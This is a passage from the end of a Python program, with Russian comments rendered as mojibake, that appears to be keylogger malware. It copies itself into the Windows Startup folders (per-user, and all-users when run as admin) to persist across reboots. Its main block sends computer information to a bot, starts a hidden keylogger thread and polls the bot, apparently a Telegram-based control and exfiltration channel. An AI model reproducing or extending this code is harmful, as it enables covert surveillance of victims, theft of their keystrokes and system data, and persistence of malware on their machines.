    # –î–ª—è –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏ —Å–∫–æ–ø–∏—Ä—É–π—Ç–µ —Å–∫—Ä–∏–ø—Ç –≤ –ø–∞–ø–∫—É, —á—Ç–æ–±—ã –æ–Ω –Ω–µ –±—ã–ª —É–¥–∞–ª–µ–Ω –∏–ª–∏ –ø–µ—Ä–µ–º–µ—â–µ–Ω
    startup_folder_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    script_destination = os.path.join(startup_folder_path, script_name)
    
    try:
        if not os.path.exists(startup_folder_path):
            os.makedirs(startup_folder_path)
        shutil.copy(script_path, script_destination)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ –≤ –ø–∞–ø–∫—É –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏: {str(e)}")
    
    # –°–æ–∑–¥–∞–π—Ç–µ —è—Ä–ª—ã–∫ –Ω–∞ —Å–∫—Ä–∏–ø—Ç –≤ –ø–∞–ø–∫–µ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
    if not os.path.isfile(script_destination):
        print(f"–ù–µ —É–¥–∞–ª–æ—Å—å —Å–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å —Å–∫—Ä–∏–ø—Ç –≤ –ø–∞–ø–∫—É –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏.")
    
    # –î–æ–±–∞–≤—å—Ç–µ —è—Ä–ª—ã–∫ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É –¥–ª—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
    if add_for_all_users:
        all_users_startup = os.path.join(os.environ['ProgramData'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'StartUp')
        script_destination_all_users = os.path.join(all_users_startup, script_name)
        try:
            if not os.path.exists(all_users_startup):
                os.makedirs(all_users_startup)
            shutil.copy(script_path, script_destination_all_users)
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ —Å–∫—Ä–∏–ø—Ç–∞ –¥–ª—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {str(e)}")
    
    return script_destination

# –ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è
if ctypes.windll.shell32.IsUserAnAdmin():
    script_path = sys.argv[0]  # –ü—É—Ç—å –∫ —Ç–µ–∫—É—â–µ–º—É —Å–∫—Ä–∏–ø—Ç—É
    add_to_startup(script_path, add_for_all_users=False)  # –î–æ–±–∞–≤—å—Ç–µ —Å–∫—Ä–∏–ø—Ç –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É –¥–ª—è —Ç–µ–∫—É—â–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        
if __name__ == "__main__":
    send_computer_info_bot()
    logger = KeyLogger() 
    logger_thread = threading.Thread(target=logger.run) #–°–æ–∑–¥–∞—ë–º –∏ –∑–∞–ø—É—Å–∫–∞–µ–º –ø–æ—Ç–æ–∫ –¥–ª—è –∫–µ–π–ª–æ–≥–≥–µ—Ä–∞
    logger_thread.daemon = True
    logger_thread.start()
    bot.polling(none_stop=True, interval=0, timeout=20)
    app = QApplication([])
    app.exec_()
